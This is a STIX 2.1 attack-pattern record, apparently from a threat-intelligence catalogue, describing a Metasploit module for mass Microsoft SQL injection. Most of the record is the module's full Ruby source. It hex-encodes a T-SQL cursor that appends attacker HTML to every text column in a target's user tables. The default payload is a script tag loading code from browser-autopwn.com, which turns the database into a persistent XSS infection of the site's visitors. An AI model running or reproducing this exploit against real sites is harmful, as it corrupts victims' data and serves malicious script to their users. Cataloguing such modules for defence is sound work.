{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1275d4bd-c3dc-4850-8b5e-cc1c37332bd9",
    "created": "2024-08-14T16:30:31.496342Z",
    "modified": "2024-08-14T16:30:31.496356Z",
    "name": "HTTP Microsoft SQL Injection Table XSS Infection",
    "description": " This module implements the mass SQL injection attack in use lately by concatenation of HTML string that forces a persistent XSS attack to redirect user browser to an attacker controller website. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/lucky_punch.rb",
            "external_id": "lucky_punch.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::WmapModule\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HTTP Microsoft SQL Injection Table XSS Infection',\n      'Description'    => %q{\n        This module implements the mass SQL injection attack in\n        use lately by concatenation of HTML string that forces a persistent\n        XSS attack to redirect user browser to an attacker controller website.\n      },\n      'Author'         => [ 'et' ],\n      'License'        => BSD_LICENSE))\n\n    register_options(\n      [\n        OptString.new('URI', [ true,  \"The path/file to identify backups\", '/index.asp']),\n        OptString.new('QUERY', [ true,  \"HTTP URI Query\", 'p1=v1&p2=v2&p3=v3']),\n        OptString.new('VULN_PAR', [ true,  \"Vulnerable parameter name\", 'p1']),\n        OptBool.new('TEXT_INT_INJECTION', [ true,  \"Perform string injection\", false]),\n        OptBool.new('COMMENTED', [ true,  \"Comment end of query\", true]),\n        OptString.new('EVIL_HTML', [ true,  \"Evil HTML to add to tables\", '<script src=http://browser-autopwn.com/evilscript.js></script>']),\n      ])\n\n  end\n\n  def run_host(ip)\n\n    # Weird to indent for practical reasons.\n    infstr = <<-EOF\nDECLARE @T varchar(255),@C varchar(255)\nDECLARE Table_Cursor CURSOR FOR\nselect a.name,b.name from sysobjects a,syscolumns b\nwhere a.id=b.id and a.xtype='u' and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167)\nOPEN Table_Cursor\nFETCH NEXT FROM Table_Cursor INTO @T,@C\nWHILE(@@FETCH_STATUS=0)\nBEGIN\nexec('update ['+@T+'] set ['+@C+']=rtrim(convert(varchar,['+@C+']))+''#{datastore['EVIL_HTML']}''')\nFETCH NEXT FROM Table_Cursor INTO @T,@C\nEND\nCLOSE Table_Cursor\nDEALLOCATE Table_Cursor\nEOF\n\n    infstr.gsub!(/(\\t|\\n|\\r)/,\"\")\n\n    prestr = \";DECLARE @S NVARCHAR(4000);SET @S=CAST(\"\n    poststr = \" AS NVARCHAR(4000));EXEC(@S);\"\n\n    gvars = queryparse(datastore['QUERY']) #Now its a Hash\n\n    if gvars.has_key?(datastore['VULN_PAR'])\n\n      prestr  = datastore['TEXT_INT_INJECTION'] ? \"\\'#{prestr}\" : ''\n      poststr = datastore['COMMENTED'] ? \"#{poststr}--\" : ''\n\n      attstr = \"\"\n      infstr.unpack(\"C*\").collect! { |i| attstr += i.to_s(base=16).upcase+\"00\" }\n      gvars[datastore['VULN_PAR']] += prestr + \"0x\"+attstr + poststr\n    else\n      print_error(\"Error: Vulnerable parameter is not part of the supplied query string.\")\n    return\n  end\n\n  begin\n    normalres = send_request_cgi({\n      'uri'          =>  normalize_uri(datastore['URI']),\n      'vars_get'     =>  gvars,\n      'method'       => 'GET',\n      'ctype'        => 'text/plain'\n    }, 20)\n\n  rescue ::Rex::ConnectionError\n  rescue ::Errno::EPIPE\n  end\n\n  print_status(\"Request sent.\")\n\n  end\nend\n"
}